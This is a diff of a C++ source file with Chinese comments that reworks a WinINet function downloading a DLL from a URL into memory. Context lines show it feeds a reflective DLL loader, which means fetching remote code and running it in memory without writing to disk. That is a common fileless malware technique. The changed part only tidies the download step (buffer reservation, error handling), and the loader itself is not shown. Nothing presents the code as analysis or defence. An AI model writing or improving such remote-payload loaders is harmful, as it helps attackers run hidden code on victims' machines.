@@ -14,35 +14,56 @@ typedef BOOL(WINAPI* f_DLL_ENTRY_POINT)(void*, DWORD, void*);
 
 // --- 工具函数：下载 DLL 到内存 ---
 bool DownloadToMemory(const std::string& url, std::vector<BYTE>& outBuffer) {
-    // 1. 初始化，增加异步或代理兼容性
-    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = NULL;
+    HINTERNET hUrl = NULL;
+    bool success = false;
+
+    // 1. 初始化 Internet 环境
+    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) return false;
 
-    // 2. 开启 URL，添加处理重定向和缓存的标志
-    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
-
-    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, flags, 0);
-
+    // 2. 开启 URL (包含安全和重定向标志)
+    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_SECURE;
+    hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, flags, 0);
     if (!hUrl) {
-        DWORD err = GetLastError();
-        std::cout << "[!] InternetOpenUrlA failed. Error: " << err << std::endl;
         InternetCloseHandle(hInternet);
         return false;
     }
 
-    // 3. 读取数据
-    BYTE tempBuffer[4096];
+    // 3. 获取文件大小 (解决大文件处理性能的关键)
+    DWORD contentLength = 0;
+    DWORD dwSize = sizeof(contentLength);
+    DWORD dwIndex = 0;
+
+    // 查询 Content-Length
+    if (HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &dwSize, &dwIndex)) {
+        outBuffer.reserve(contentLength); // 预留空间，防止多次内存重分配
+    }
+
+    // 4. 高效读取循环
+    const DWORD BUFFER_SIZE = 65536; // 64KB 缓冲区
+    BYTE tempBuffer[BUFFER_SIZE];
     DWORD bytesRead = 0;
     outBuffer.clear();
 
-    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
-        outBuffer.insert(outBuffer.end(), tempBuffer, tempBuffer + bytesRead);
+    try {
+        while (InternetReadFile(hUrl, tempBuffer, BUFFER_SIZE, &bytesRead) && bytesRead > 0) {
+            // 使用 push_back 的批量形式或直接 append
+            // 此时因为已经 reserve 过，这里的操作几乎是纯内存拷贝，非常快
+            outBuffer.insert(outBuffer.end(), tempBuffer, tempBuffer + bytesRead);
+        }
+        success = !outBuffer.empty();
+    }
+    catch (const std::bad_alloc&) {
+        std::cerr << "[!] Memory allocation failed for large file." << std::endl;
+        success = false;
     }
 
-    InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
+    // 5. 清理资源
+    if (hUrl) InternetCloseHandle(hUrl);
+    if (hInternet) InternetCloseHandle(hInternet);
 
-    return !outBuffer.empty();
+    return success;
 }
 
 // --- 原有的反射式加载核心逻辑（保持不变） ---
